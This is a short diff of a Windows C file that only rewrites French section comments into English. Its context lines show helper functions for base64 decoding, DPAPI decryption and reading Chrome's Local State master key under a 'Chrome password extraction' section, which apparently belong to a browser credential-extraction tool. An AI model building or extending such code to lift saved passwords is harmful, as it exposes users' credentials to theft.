@@ -15,9 +15,7 @@
 
 #pragma comment(lib, "crypt32.lib")
 
-/* ============================================================================
- * Utilitaires
- * ============================================================================ */
+/* Helpers */
 
 /* Décode base64 */
 static BYTE* Base64Decode(const char* input, DWORD* outLen) {
@@ -55,9 +53,7 @@ static BYTE* DPAPIDecrypt(BYTE* data, DWORD dataLen, DWORD* outLen) {
     return result;
 }
 
-/* ============================================================================
- * Lecture simple de fichiers JSON (sans lib externe)
- * ============================================================================ */
+/* Minimal JSON parser (no external lib) */
 
 /* Trouve une valeur string dans un JSON simple */
 static char* JsonGetString(const char* json, const char* key) {
@@ -94,9 +90,7 @@ static char* JsonGetString(const char* json, const char* key) {
     return result;
 }
 
-/* ============================================================================
- * Chrome Password Extraction
- * ============================================================================ */
+/* Chrome password extraction */
 
 /* Lit le fichier Local State et extrait la clé maître */
 static BYTE* GetChromeMasterKey(DWORD* keyLen) {
